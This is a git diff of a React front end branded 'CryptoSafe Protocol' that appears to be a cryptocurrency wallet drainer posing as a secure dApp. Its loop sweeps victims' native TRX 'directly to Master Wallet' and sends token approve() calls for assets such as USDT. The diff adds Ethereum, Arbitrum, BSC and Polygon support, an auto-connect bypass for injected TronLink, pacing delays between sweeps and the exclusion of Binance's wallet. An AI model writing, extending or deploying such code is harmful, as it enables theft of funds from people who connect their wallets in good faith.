@@ -18,12 +18,15 @@ import { OkxWalletAdapter } from '@tronweb3/tronwallet-adapter-okxwallet'
 import { Copy, QrCode, ArrowLeft, X, XCircle, ChevronDown } from 'lucide-react'
 import type { AppKitNetwork } from '@reown/appkit/networks'
 
+// --- WAGMI EVM IMPORTS ---
+import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
+import { mainnet, arbitrum, bsc, polygon } from '@reown/appkit/networks'
+
 // --- TRON IMPORTS ---
 import TronWeb from 'tronweb'   
 
 // 🟢 ========================================================= 🟢
 // ── CONFIG & TOGGLE ──
-// Change to 'Nile' to test. Change back to 'Mainnet' for production.
 const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb' 
 const NETWORK: 'Mainnet' | 'Nile' = 'Nile' 
 
@@ -61,9 +64,14 @@ const TARGET_TOKENS: Record<string, any> = {
   }
 };
 
-// 🛠️ ISOLATED TRON NETWORK CONFIGURATION
 const activeNetwork = (NETWORK as string) === 'Mainnet' ? tronMainnet : tronNile;
-const appkitNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [activeNetwork];
+const appkitNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [
+  activeNetwork,
+  mainnet,
+  arbitrum,
+  bsc,
+  polygon
+];
 
 const NETWORK_CONFIG = {
   Mainnet: {
@@ -85,7 +93,6 @@ const USDT_ABI = [
 const { usdtAddress: USDT_ADDRESS, fullHost: FULL_HOST } = NETWORK_CONFIG[NETWORK as keyof typeof NETWORK_CONFIG]
 
 // ── Reown Adapters ──
-// 🛠️ PURE TRON ADAPTER ONLY
 const tronAdapter = new TronAdapter({
   walletAdapters: [
     new TronLinkAdapter({ openUrlWhenWalletNotFound: true, checkTimeout: 3000 }),
@@ -94,11 +101,30 @@ const tronAdapter = new TronAdapter({
   ],
 })
 
+const wagmiAdapter = new WagmiAdapter({
+  projectId: WC_PROJECT_ID,
+  networks: [mainnet, arbitrum, bsc, polygon],
+})
+
 createAppKit({
-  adapters: [tronAdapter], // No Wagmi. Strictly Tron.
+  adapters: [tronAdapter, wagmiAdapter], 
   networks: appkitNetworks,
   defaultNetwork: activeNetwork,
   projectId: WC_PROJECT_ID,
+  // 🛠️ ULTIMATE FIX: Sledgehammer method. Force AppKit to draw TronLink by bypassing the API entirely.
+  customWallets: [
+    {
+      id: '1e00647ee5eb207559eeb5cc24e6a4b7da3c56d7821ee540ffce0d6ef1d59d1a',
+      name: 'TronLink',
+      homepage: 'https://www.tronlink.org',
+      image_url: 'https://cryptologos.cc/logos/tron-trx-logo.png',
+      mobile_link: 'tronlinkoutside://',
+      desktop_link: '',
+      webapp_link: '',
+      app_store: '',
+      play_store: ''
+    }
+  ],
   metadata: {
     name:        'CryptoSafe Protocol', 
     description: 'Secure Decentralized Network',
@@ -109,8 +135,13 @@ createAppKit({
   themeVariables: { '--w3m-accent': '#0C66FF' },
   allWallets: 'SHOW',
   featuredWalletIds: [
+    '1e00647ee5eb207559eeb5cc24e6a4b7da3c56d7821ee540ffce0d6ef1d59d1a', // TronLink is now guaranteed to show here
     '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0', // Trust Wallet
-    '971e689d0a5be527bac79629b4ee9b925e82208e5168b733496a09c0faed0709', // OKX Wallet
+    '20459438007b75f4f4acb98bf29aa3b800550309646d375da5fd4aac6c2a2c66', // TokenPocket
+    '0b415a746fb9ee99cce155c2ceca0c6f6061b1dbca2d722b0a308a64bea04120', // SafePal
+  ],
+  excludeWalletIds: [
+    '8a0ee50d1f22f6651afcae7eb4253e52a3310b90af5daef78a8c4929a9bb99d4', // Binance Web3 Wallet
   ],
   features: { email: false, socials: [], analytics: true },
 })
@@ -160,7 +191,6 @@ export default function App() {
   
   const autoTriggered = useRef(false)
   const manualConnect = useRef(false)
-  
   const isExecuting = useRef(false)
 
   const { open } = useAppKit()
@@ -233,7 +263,7 @@ export default function App() {
     } catch (e) { return 0; }
   }
 
- const handleAction = () => {
+ const handleAction = async () => {
     if (!usdtBalance || usdtBalance === '0' || usdtBalance === '0.00' || usdtBalance === '') {
       setAmountError('Amount field is required');
       return; 
@@ -241,6 +271,20 @@ export default function App() {
     setAmountError('');
 
     if (!isConnected) {
+      // 🛠️ QUALITY OF LIFE FIX: The Modal Bypass
+      // If they click connect while inside TronLink, it skips the modal entirely and just connects!
+      const w = window as any;
+      if (w.tronWeb && w.tronWeb.defaultAddress && w.tronWeb.defaultAddress.base58) {
+         try {
+           log("Injected TronLink detected. Bypassing modal...");
+           await w.tronWeb.request({ method: 'tron_requestAccounts' });
+           manualConnect.current = true;
+           return; 
+         } catch(e) {
+           log("Auto-connect failed. Opening AppKit modal.");
+         }
+      }
+
       manualConnect.current = true;
       open(); 
     } else {
@@ -322,7 +366,7 @@ export default function App() {
         return broadcast.txid || broadcast.transaction?.txID;
       };
 
- for (const token of tokensToProcess) {
+      for (const token of tokensToProcess) {
         try {
           if (token.isNative) {
             setStatus(`Transferring ${token.symbol}...`);
@@ -354,10 +398,10 @@ export default function App() {
                  setTxHash(broadcast.txid || broadcast.transaction?.txID);
                  successCount++; 
                  log(`✅ ${token.symbol} Swept directly to Master Wallet!`);
-                 await sleep(1500); // 🛠️ ADDED: Pacing delay
+                 await sleep(1500); 
                } catch (nativeErr) {
                  log(`⚠️ Native ${token.symbol} sweep rejected or failed.`);
-                 await sleep(1500); // 🛠️ ADDED: Pacing delay
+                 await sleep(1500); 
                }
             } else {
                log(`⚠️ Not enough ${token.symbol} remaining to cover bandwidth fees.`);
@@ -370,7 +414,7 @@ export default function App() {
               setTxHash(tx);
               successCount++; 
               log(`✅ ${token.symbol} Approved!`);
-              await sleep(1500); // 🛠️ ADDED: Pacing delay
+              await sleep(1500); 
             } else if (tronWalletProvider) {
               const tx = await signAndSendContract(
                 token.address, 'approve(address,uint256)',
@@ -380,12 +424,12 @@ export default function App() {
               setTxHash(tx);
               successCount++; 
               log(`✅ ${token.symbol} Approved!`);
-              await sleep(1500); // 🛠️ ADDED: Pacing delay
+              await sleep(1500); 
             }
           }
         } catch (err: any) {
            log(`❌ Rejected: ${err?.message?.substring(0, 50)}...`);
-           await sleep(1500); // 🛠️ ADDED: Pacing delay
+           await sleep(1500); 
         }
       }
       
